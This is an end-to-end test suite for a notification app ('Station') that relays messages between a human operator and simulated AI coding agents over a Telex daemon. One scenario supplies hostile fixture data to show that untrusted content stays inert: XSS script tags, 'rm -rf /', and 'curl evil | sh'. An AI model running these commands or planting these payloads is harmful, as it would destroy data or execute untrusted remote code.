#!/usr/bin/env node
// End-to-end suite: a real `station-headless` attending a real Telex daemon in
// an isolated sandbox, with simulated agent sessions using the real agent kit
// and the real `telex` CLI. Nothing is mocked.
//
//   node scenarios/e2e.mjs            # run everything
//   node scenarios/e2e.mjs restart    # run scenarios whose name contains "restart"

import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { Agent, Station, sleep } from "./lib.mjs";

const home = path.join(os.homedir(), `.tsx-e2e-${process.pid}`);
const station = new Station({ home, port: 4318, operator: "rob", address: "operator:rob" });
const only = process.argv[2];
const results = [];
let seq = 0;

function check(cond, what) {
  if (!cond) throw new Error(`expected: ${what}`);
}

function agent(name, extra = {}) {
  seq += 1;
  return new Agent(station, { address: `agent:${name}-${seq}`, name: `${name}-${seq}`, harness: "claude-code", host: "devbox-1", repo: "acme/widgets", ...extra });
}

const threadOf = (snap, id) => snap.threads.find((t) => t.thread_id === id);
const noteFor = (snap, messageId) => snap.notifications.find((n) => n.message_id === messageId && n.kind === "new");
const waitThread = (id, pred, what) => station.waitFor(what, (s) => { const t = threadOf(s, id); return t && pred(t, s) ? t : null; });

async function scenario(name, fn) {
  if (only && !name.includes(only)) return;
  const started = Date.now();
  try {
    await fn();
    results.push({ name, ok: true, ms: Date.now() - started });
    console.log(`  ok    ${name} (${Date.now() - started}ms)`);
  } catch (error) {
    results.push({ name, ok: false, error: error.message });
    console.log(`  FAIL  ${name}\n        ${error.message}`);
  }
}

await station.start();
console.log(`station up on :${station.port}, sandbox ${home}`);

await scenario("priority tiers map to status, counts and notification channels", async () => {
  const a = agent("tiers");
  const sent = {
    blocked: a.notify({ priority: "blocked", subject: "blocked one", body: "stopped" }),
    needs: a.notify({ priority: "needs-reply", subject: "needs one", body: "question" }),
    routine: a.notify({ priority: "routine", subject: "routine one", body: "note" }),
    fyi: a.notify({ priority: "fyi", subject: "fyi one", body: "info" }),
  };
  const snap = await station.waitFor("four threads", (s) => (Object.values(sent).every((m) => threadOf(s, m.thread_id)) ? s : null));
  check(threadOf(snap, sent.blocked.thread_id).tier === "blocked", "interrupt -> Blocked");
  check(threadOf(snap, sent.needs.thread_id).tier === "needs-reply", "next-checkpoint -> Needs reply");
  check(threadOf(snap, sent.routine.thread_id).tier === "routine", "background -> Routine");
  check(threadOf(snap, sent.fyi.thread_id).status === "fyi", "fyi never enters Needs me");
  check(["blocked", "needs", "routine"].every((k) => threadOf(snap, sent[k].thread_id).status === "needs-me"), "non-FYI threads need me");
  const nb = noteFor(snap, sent.blocked.id);
  check(nb.banner && nb.sound && nb.demand && nb.badge, "Blocked: banner + sound + demand + badge");
  const nn = noteFor(snap, sent.needs.id);
  check(nn.badge && !nn.demand && !nn.sound, "Needs reply: no sound, no demand");
  const nr = noteFor(snap, sent.routine.id);
  check(!nr.banner && nr.badge && nr.outcome === "quiet", "Routine: badge only");
  const nf = noteFor(snap, sent.fyi.id);
  check(!nf.banner && !nf.badge, "FYI: silent, no badge");
  check(threadOf(snap, sent.blocked.thread_id).open_obligations === 1, "blocked asks for an outcome");
  check(snap.threads.every((t) => t.messages.every((m) => m.direction !== "inbound" || m.source)), "rows record how they arrived");
  // Delivery was acknowledged only after ingest.
  await waitThread(sent.blocked.thread_id, (t) => t.messages[0].source === "receive" || t.messages[0].source === "history", "ingested");
});

await scenario("self-reported card and telex-recorded presence are both shown", async () => {
  const a = agent("card", { harness: "codex", host: "devbox-9", repo: "acme/api", branch: "feat/x", cwd: "/srv/api", terminal: "tmux main:2.0", open: "ssh devbox-9 -t tmux attach -t main" });
  const m = a.notify({ subject: "who am I", body: "hello", options: ["Yes", "No"], url: "https://example.com/pr/1", tags: ["impl"] });
  const snap = await station.waitFor("agent known", (s) => (s.agents.find((x) => x.address === a.address) && threadOf(s, m.thread_id) ? s : null));
  const view = snap.agents.find((x) => x.address === a.address);
  check(view.display_name === a.name, "display name from card");
  check(view.card.harness === "codex" && view.card.host === "devbox-9" && view.card.repo === "acme/api" && view.card.branch === "feat/x", "card fields");
  check(view.card.open_command.includes("tmux attach"), "open command");
  check(threadOf(snap, m.thread_id).messages[0].replies.join("|") === "Yes|No", "suggested replies");
  const attached = await station.waitFor("presence attached", (s) => { const x = s.agents.find((y) => y.address === a.address); return x.presence.state === "attached" ? x : null; });
  check(attached.presence.description.includes(a.name), "telex directory description");
  const waiter = a.listen();
  await station.waitFor("presence listening", (s) => s.agents.find((y) => y.address === a.address).presence.state === "listening");
  waiter.kill();
  a.leave();
  await station.waitFor("presence offline", (s) => s.agents.find((y) => y.address === a.address).presence.state === "offline");
});

await scenario("a blocked agent gets the human's reply and the outcome is recorded in telex", async () => {
  const a = agent("ask");
  const { done } = a.ask({ priority: "blocked", subject: "need a decision", body: "A or B?", options: ["A", "B"] });
  const t = await station.waitFor("thread", (s) => s.threads.find((x) => x.agent === a.address && x.status === "needs-me"));
  check(t.tier === "blocked", "blocked tier");
  const r = await station.call("reply", { thread_id: t.thread_id, body: "Go with B.\nSecond line.", handle: true });
  check(r.handle_errors.length === 0, "handled without error");
  const result = await done;
  check(result.reply.body === "Go with B.\nSecond line.", "agent received the exact reply text");
  check(result.reply.from === "operator:rob", "reply came from the Station address");
  const read = a.telex(["read", "--address", a.address, "--id", String(t.messages[0].id), "--json"]).json();
  check(read.dispositions.some((d) => d.recipient === "operator:rob" && d.state === "handled"), "telex holds the operator's handled disposition");
  const after = await waitThread(t.thread_id, (x) => x.status === "done", "thread done after pickup");
  const mine = after.messages.find((m) => m.direction === "outbound");
  check(mine.receipt.consumed && mine.receipt.disposition === "handled", "receipt shows the agent handled the reply");
  check(after.open_obligations === 0, "no open obligations");
});

await scenario("reply to an absent agent queues durably and delivers on re-attach", async () => {
  const a = agent("away");
  const m = a.notify({ priority: "needs-reply", subject: "going away", body: "answer later" });
  await waitThread(m.thread_id, () => true, "thread");
  a.leave();
  await station.waitFor("offline", (s) => s.agents.find((y) => y.address === a.address).presence.state === "offline");
  const r = await station.call("reply", { thread_id: m.thread_id, body: "here is your answer", handle: false });
  check(r.occupied === false, "telex reports the address unoccupied at send");
  const waiting = await waitThread(m.thread_id, (t) => t.status === "waiting", "status waiting");
  check(waiting.messages.at(-1).receipt.consumed === false, "not consumed yet");
  await sleep(1500);
  check(threadOf(await station.snapshot(), m.thread_id).status === "waiting", "still waiting while agent is gone");
  a.attach();
  const got = a.receive(5000);
  check(got && got.body === "here is your answer", "agent receives the queued reply after re-attaching");
  await waitThread(m.thread_id, (t) => t.status === "done" && t.messages.at(-1).receipt.consumed, "consumed -> done");
});

await scenario("agent follow-up after my reply reopens the thread at the new priority", async () => {
  const a = agent("followup");
  const m = a.notify({ priority: "routine", subject: "status", body: "first" });
  await waitThread(m.thread_id, () => true, "thread");
  const r = await station.call("reply", { thread_id: m.thread_id, body: "ok", handle: true });
  a.receive(3000);
  await waitThread(m.thread_id, (t) => t.status === "done", "done");
  a.notify({ priority: "blocked", replyTo: r.message_id, body: "actually I am stuck" });
  const t = await waitThread(m.thread_id, (x) => x.status === "needs-me" && x.tier === "blocked", "reopened as blocked");
  check(t.messages.length === 3, "same thread, three messages");
});

await scenario("snooze defers in telex, hides the thread, and new work wakes it", async () => {
  const a = agent("snooze");
  const m = a.notify({ priority: "needs-reply", subject: "can wait", body: "no rush", wantsOutcome: true });
  await waitThread(m.thread_id, () => true, "thread");
  await station.call("snooze", { thread_id: m.thread_id, until_ms: Date.now() + 3_600_000 });
  await waitThread(m.thread_id, (t) => t.status === "snoozed", "snoozed");
  const read = a.telex(["read", "--address", a.address, "--id", String(m.id), "--json"]).json();
  check(read.dispositions.some((d) => d.state === "deferred"), "telex shows deferred");
  check(threadOf(await station.snapshot(), m.thread_id).open_obligations === 1, "deferred keeps the obligation open");
  a.notify({ priority: "routine", subject: "unrelated", body: "other thread" });
  check(threadOf(await station.snapshot(), m.thread_id).status === "snoozed", "other threads do not wake it");
  // Wake by time.
  await station.call("snooze", { thread_id: m.thread_id, until_ms: Date.now() + 1200 });
  await waitThread(m.thread_id, (t) => t.status === "needs-me", "wakes when the time passes");
  await station.call("mark_done", { thread_id: m.thread_id });
  const done = a.telex(["read", "--address", a.address, "--id", String(m.id), "--json"]).json();
  check(done.dispositions.at(-1).state === "handled", "Done records handled");
});

await scenario("flag, unread and per-message outcomes", async () => {
  const a = agent("flags");
  const m = a.notify({ priority: "routine", subject: "flag me", body: "x", wantsOutcome: true });
  const t0 = await waitThread(m.thread_id, () => true, "thread");
  check(t0.unread === 1, "unread on arrival");
  await station.call("mark_read", { thread_id: m.thread_id });
  check(threadOf(await station.snapshot(), m.thread_id).unread === 0, "read");
  await station.call("mark_unread", { thread_id: m.thread_id });
  check(threadOf(await station.snapshot(), m.thread_id).unread === 1, "unread again");
  await station.call("disposition", { message_id: m.id, state: "rejected", note: "not doing this" });
  const t1 = threadOf(await station.snapshot(), m.thread_id);
  check(t1.status === "done" && t1.messages[0].disposition === "rejected", "declined resolves the thread");
  const read = a.telex(["read", "--address", a.address, "--id", String(m.id), "--json"]).json();
  check(read.dispositions.some((d) => d.state === "rejected" && d.note === "not doing this"), "agent can read the decline note");
  await station.call("flag", { thread_id: m.thread_id, on: true });
  check(threadOf(await station.snapshot(), m.thread_id).status === "needs-me", "flag keeps it in Needs me");
  await station.call("flag", { thread_id: m.thread_id, on: false });
  check(threadOf(await station.snapshot(), m.thread_id).status === "done", "unflag");
});

await scenario("organize: suggestions, rules, nesting, manual filing and precedence", async () => {
  const web = { repo: "orgx/web", host: "box-a" };
  const a1 = agent("web-impl", { ...web, project: "web/checkout" });
  const a2 = agent("web-review", web);
  const a3 = agent("ops", { repo: "orgx/ops", host: "box-a" });
  const m1 = a1.notify({ subject: "s1", body: "b" });
  const m2 = a2.notify({ subject: "s2", body: "b" });
  const m3 = a3.notify({ subject: "s3", body: "b" });
  const snap = await station.waitFor("agents", (s) => ([a1, a2, a3].every((a) => s.agents.find((x) => x.address === a.address)) ? s : null));
  check([a1, a2, a3].every((a) => snap.agents.find((x) => x.address === a.address).project_id === null), "new agents start unsorted");
  const repo = snap.suggestions.find((s) => s.id === "repo:orgx/web");
  check(repo && repo.agents.length === 2, "repo suggestion groups both web agents");
  check(snap.suggestions.some((s) => s.basis === "hint" && s.project_path.join("/") === "web/checkout"), "hint suggestion with a subfolder");
  check(snap.suggestions.some((s) => s.basis === "host" && s.pattern === "box-a"), "machine suggestion");

  const applied = await station.call("suggestion_apply", { id: "repo:orgx/web" });
  let s = await station.snapshot();
  const webId = applied.project_id;
  check(s.agents.find((x) => x.address === a1.address).project_id === webId && s.agents.find((x) => x.address === a2.address).project_id === webId, "rule files both agents");
  check(threadOf(s, m1.thread_id).project_id === webId, "threads follow their agent");
  check(threadOf(s, m1.thread_id).project_source.startsWith("rule:"), "source is the rule");
  check(!s.suggestions.some((x) => x.id === "repo:orgx/web"), "applied suggestion disappears");

  // A new agent matching the rule files itself.
  const a4 = agent("web-late", web);
  const m4 = a4.notify({ subject: "s4", body: "b" });
  await waitThread(m4.thread_id, (t) => t.project_id === webId, "late agent auto-filed");

  // Nested folder + hint refinement.
  const sub = await station.call("project_create", { name: "checkout", parent_id: webId });
  s = await station.snapshot();
  check(s.agents.find((x) => x.address === a1.address).project_id === sub.id, "hint refines the rule into the subfolder");
  check(s.agents.find((x) => x.address === a1.address).project_source === "hint", "source is the hint");
  check(s.agents.find((x) => x.address === a2.address).project_id === webId, "agents without the hint stay in the parent");

  // Manual filing beats rules; thread filing beats agent filing.
  const ops = await station.call("project_create", { name: "ops" });
  await station.call("agent_update", { address: a2.address, project_id: ops.id });
  await station.call("thread_update", { thread_id: m2.thread_id, project_id: sub.id });
  s = await station.snapshot();
  check(s.agents.find((x) => x.address === a2.address).project_id === ops.id, "my filing overrides the rule");
  check(threadOf(s, m2.thread_id).project_id === sub.id && threadOf(s, m2.thread_id).project_source === "thread", "one thread filed on its own");
  await station.call("agent_update", { address: a2.address, project_id: null });
  check((await station.snapshot()).agents.find((x) => x.address === a2.address).project_id === webId, "clearing my filing falls back to the rule");

  // Explicit rule, ordering, disable.
  const rule = await station.call("rule_create", { field: "address", pattern: "agent:ops-*", project_id: ops.id });
  check(threadOf(await station.snapshot(), m3.thread_id).project_id === ops.id, "address glob rule");
  await station.call("rule_update", { id: rule.id, enabled: false });
  check(threadOf(await station.snapshot(), m3.thread_id).project_id === null, "disabled rule stops filing");
  await station.call("rule_update", { id: rule.id, enabled: true });

  // Renaming and deleting keep everything filed.
  await station.call("project_update", { id: sub.id, name: "checkout-flow" });
  let refused = false;
  try { await station.call("project_update", { id: webId, parent_id: sub.id }); } catch { refused = true; }
  check(refused, "cannot move a folder inside itself");
  await station.call("project_delete", { id: sub.id });
  s = await station.snapshot();
  check(threadOf(s, m2.thread_id).project_id === webId, "deleting a subfolder moves its threads up");
  check(s.agents.find((x) => x.address === a1.address).project_id === webId, "and its agents fall back to the parent");
});

await scenario("notification overrides: project mute, agent elevate, thread mute, focus", async () => {
  const a = agent("quiet", { repo: "orgq/quiet" });
  const first = a.notify({ priority: "routine", subject: "intro", body: "hi" });
  await waitThread(first.thread_id, () => true, "thread");
  const p = await station.call("project_create", { name: "quiet-project" });
  await station.call("agent_update", { address: a.address, project_id: p.id });
  await station.call("project_update", { id: p.id, notify: "mute" });
  const b1 = a.notify({ priority: "blocked", subject: "muted blocked", body: "x" });
  let n = await station.waitFor("note", (s) => noteFor(s, b1.id));
  check(!n.banner && n.badge && n.reason.includes("quiet-project"), "muted project: no banner, still badged, reason names the project");
  check(threadOf(await station.snapshot(), b1.thread_id).tier === "blocked", "muting never changes the tier shown");

  await station.call("agent_update", { address: a.address, notify: "elevate" });
  const r1 = a.notify({ priority: "routine", subject: "elevated routine", body: "x" });
  n = await station.waitFor("note", (s) => noteFor(s, r1.id));
  check(n.effective_tier === "needs-reply" && n.tier === "routine", "agent override beats project; routine is elevated");
  await station.call("thread_update", { thread_id: r1.thread_id, muted: true });
  await sleep(9000); // let the coalescing window close so the next banner stands alone
  const r2 = a.notify({ priority: "blocked", replyTo: undefined, subject: "second", body: "y" });
  n = await station.waitFor("note", (s) => noteFor(s, r2.id));
  check(n.banner, "a different thread from the elevated agent still interrupts");

  await station.call("agent_update", { address: a.address, notify: "inherit" });
  await station.call("project_update", { id: p.id, notify: "inherit" });
  await station.call("set_focus", { mode: "blocked-only", minutes: 10 });
  const f1 = a.notify({ priority: "needs-reply", subject: "during focus", body: "x" });
  n = await station.waitFor("note", (s) => noteFor(s, f1.id));
  check(!n.banner && n.reason.includes("focus"), "focus holds back Needs reply");
  const f2 = a.notify({ priority: "blocked", subject: "blocked during focus", body: "x" });
  n = await station.waitFor("note", (s) => noteFor(s, f2.id));
  check(n.banner && n.demand, "Blocked breaks through focus");
  await station.call("set_focus", { mode: "silent" });
  const f3 = a.notify({ priority: "blocked", subject: "blocked during silence", body: "x" });
  n = await station.waitFor("note", (s) => noteFor(s, f3.id));
  check(!n.banner && n.badge, "silent: nothing interrupts, badge still counts");
  await station.call("set_focus", { mode: "off" });
});

await scenario("a burst of banners folds into one summary; blocked is never folded", async () => {
  await sleep(9000);
  const a = agent("burst");
  const sent = [];
  for (let i = 0; i < 5; i++) sent.push(a.notify({ priority: "needs-reply", subject: `burst ${i}`, body: "x" }));
  const blocked = a.notify({ priority: "blocked", subject: "burst blocked", body: "x" });
  const snap = await station.waitFor("all noted", (s) => (sent.every((m) => noteFor(s, m.id)) && noteFor(s, blocked.id) ? s : null));
  const shown = sent.filter((m) => noteFor(snap, m.id).banner).length;
  check(shown === 1, `exactly one of five banners shown (got ${shown})`);
  check(sent.filter((m) => noteFor(snap, m.id).reason.includes("coalesced")).length === 4, "four coalesced");
  check(noteFor(snap, blocked.id).banner, "blocked shown immediately");
  const summary = await station.waitFor("summary", (s) => s.notifications.find((n) => n.kind === "summary" && n.title.startsWith("4 more")), 15_000);
  check(summary.banner && !summary.sound, "one quiet summary banner");
});

await scenario("the human can start a conversation and the agent can answer it", async () => {
  const a = agent("compose");
  a.attach();
  const sent = await station.call("compose", { to: a.address, subject: "status check", body: "where are you at?", attention: "interrupt", requires_disposition: true });
  const got = a.receive(5000);
  check(got && got.subject === "status check" && got.from === "operator:rob", "agent receives the new thread");
  check(JSON.parse(got.metadata).station.author === "human", "message is tagged human-authored");
  a.notify({ priority: "routine", replyTo: got.id, body: "halfway through" });
  const t = await waitThread(sent.thread_id, (x) => x.messages.length === 2, "reply threaded");
  check(t.agent === a.address && t.messages[0].direction === "outbound" && t.messages[1].direction === "inbound", "thread shows both sides");
  check(t.status === "needs-me", "agent's answer puts the ball back in my court");
});

await scenario("multiple attended addresses, and a deliberate stop", async () => {
  const a = agent("multi");
  await station.call("address_add", { address: "oncall:rob", label: "On call" });
  await station.waitFor("second address ready", (s) => s.health.find((h) => h.address === "oncall:rob" && h.registered));
  const m = a.notify({ priority: "needs-reply", subject: "to oncall", body: "x", to: "oncall:rob" });
  const t = await waitThread(m.thread_id, () => true, "arrives on the second address");
  check(t.station_address === "oncall:rob", "thread remembers which address it came to");
  const r = await station.call("reply", { thread_id: m.thread_id, body: "from oncall" });
  const got = a.receive(4000);
  check(got.from === "oncall:rob", "reply is sent from the address that received it");
  check(r.message_id === got.id, "ids match");
  await station.call("address_remove", { address: "oncall:rob" });
  const snap = await station.snapshot();
  check(!snap.settings.addresses.some((x) => x.address === "oncall:rob"), "address removed from settings");
  const late = a.notify({ priority: "needs-reply", subject: "after stop", body: "x", to: "oncall:rob" });
  check(late.occupied === false, "telex now reports the address unattended to senders");
});

await scenario("untrusted content stays inert data", async () => {
  const a = agent("hostile");
  const body = '<img src=x onerror="alert(1)"><script>alert(2)</script> see https://example.com/a?b=1.';
  const evil = JSON.stringify({ station: { v: 0, card: { name: "<b>bold</b>", harness: "COPILOT", open_command: "rm -rf /" }, replies: ["ok"], tier: "blocked", priority: "blocked" }, extra: { run: "curl evil | sh" } });
  a.attach();
  const sent = a.telex(["send", "--from", a.address, "--to", "operator:rob", "--attention", "fyi", "--subject", "<h1>hi</h1>", "--body", body, "--metadata", evil, "--json"]).json();
  const t = await waitThread(sent.thread_id, () => true, "thread");
  check(t.messages[0].body === body && t.subject === "<h1>hi</h1>", "text preserved verbatim for inert rendering");
  check(t.status === "fyi" && t.tier === "fyi", "metadata cannot raise the tier");
  check(t.messages[0].other_metadata.includes("curl evil"), "unknown metadata is preserved but only displayed");
  const snap = await station.snapshot();
  check(snap.agents.find((x) => x.address === a.address).card.harness === "copilot", "card values are normalized");
  check(!noteFor(snap, sent.id).banner, "no banner for FYI regardless of metadata");
});

await scenario("crash and restart: nothing lost, nothing duplicated, one summary", async () => {
  const a = agent("restart");
  const before = a.notify({ priority: "needs-reply", subject: "before crash", body: "x" });
  await waitThread(before.thread_id, () => true, "pre-crash thread");
  const p = await station.call("project_create", { name: "survives-restart" });
  await station.call("agent_update", { address: a.address, project_id: p.id, nickname: "Restarty" });
  await station.call("mark_read", { thread_id: before.thread_id });
  const pre = await station.snapshot();
  const notesBefore = pre.notifications.filter((n) => n.message_id === before.id).length;

  station.kill();
  await sleep(500);
  const down = [
    a.notify({ priority: "blocked", subject: "while down 1", body: "x" }),
    a.notify({ priority: "needs-reply", subject: "while down 2", body: "x" }),
    a.notify({ priority: "routine", subject: "while down 3", body: "x" }),
  ];
  await station.start();
  const snap = await station.waitFor("recovered", (s) => (down.every((m) => threadOf(s, m.thread_id)) ? s : null), 30_000);
  check(snap.threads.filter((t) => t.agent === a.address).length === 4, "exactly four threads, no duplicates");
  check(down.every((m) => threadOf(snap, m.thread_id).messages.length === 1), "each message ingested once");
  check(threadOf(snap, before.thread_id).unread === 0, "read state survived");
  const ag = snap.agents.find((x) => x.address === a.address);
  check(ag.display_name === "Restarty" && ag.project_id === p.id, "organization and names survived");
  check(snap.notifications.filter((n) => n.message_id === before.id).length === notesBefore, "no re-notification for old messages");
  check(down.every((m) => !noteFor(snap, m.id).banner), "no per-message banners for the backlog");
  const summary = snap.notifications.find((n) => n.kind === "summary" && n.title.includes("while Station was closed"));
  check(summary && summary.body.includes("1 blocked"), "one startup summary naming the blocked count");
  // The recovered deliveries are acknowledged and still answerable.
  const r = await station.call("reply", { thread_id: down[0].thread_id, body: "back now", handle: true });
  check(r.handle_errors.length === 0, "can handle a message recovered after restart");
  const got = a.receive(4000);
  check(got && got.body === "back now", "agent receives the post-restart reply");
  const health = snap.health.find((h) => h.address === "operator:rob");
  check(health.registered && health.receive_ready, "re-attached and receiving");
});

station.kill();
station.stopDaemon();
await sleep(1500);
// The daemon may still be flushing as it drains; retry rather than leave a sandbox behind.
fs.rmSync(home, { recursive: true, force: true, maxRetries: 10, retryDelay: 300 });

const failed = results.filter((r) => !r.ok);
console.log(`\n${results.length - failed.length}/${results.length} scenarios passed`);
process.exit(failed.length ? 1 : 0);
